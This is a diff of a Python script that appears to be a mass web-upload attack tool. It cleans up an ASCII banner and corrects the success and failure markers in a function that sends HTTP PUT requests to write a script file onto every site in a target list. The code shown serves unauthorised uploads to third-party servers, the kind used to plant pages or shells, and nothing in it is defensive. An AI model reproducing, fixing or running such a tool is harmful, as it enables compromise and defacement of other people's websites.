@@ -8,11 +8,11 @@ except ImportError:
    exit("bye Bye Min ar lol")
 
 banner = """
-    ╔═╗──────────╔══╗──────────╔╗╔╗─── '
-'   ║╬║╔╦╗╔═╗─╔═╗║══╣╔═╗╔═╦╗╔═╗║╚╝║╔══╗╔═╗╔═╗'
-'   ║╔╝║║║║╬╚╗║╩╣╠══║║╬║║║║║║╩╣║╔╗║║║║║║╬║║╬║ '
-'   ╚╝─╠╗║╚══╝╚═╝╚══╝╚═╝╚╩═╝╚═╝╚╝╚╝╚╩╩╝╚═╝╚═╝'
-'   ───╚═╝───────────────────────────'
+    ╔═╗──────────╔══╗──────────╔╗╔╗─── 
+    ║╬║╔╦╗╔═╗─╔═╗║══╣╔═╗╔═╦╗╔═╗║╚╝║╔══╗╔═╗╔═╗
+    ║╔╝║║║║╬╚╗║╩╣╠══║║╬║║║║║║╩╣║╔╗║║║║║║╬║║╬║ 
+    ╚╝─╠╗║╚══╝╚═╝╚══╝╚═╝╚╩═╝╚═╝╚╝╚╝╚╩╩╝╚═╝╚═╝
+    ───╚═╝───────────────────────────
 """
 
 b = '\033[31m'
@@ -41,9 +41,9 @@ def aox(script,target_file="pyae.txt"):
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
             if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+" ✓"+m+" ] %s/%s"%(site,script))
+               print(m+"["+b+" ×"+m+" ] %s/%s"%(site,script))
             else:
-               print(m+"["+h+" ××"+m+" ] %s/%s"%(site,script))
+               print(m+"["+h+" ✓"+m+" ] %s/%s"%(site,script))
 
          except requests.exceptions.RequestException:
             continue
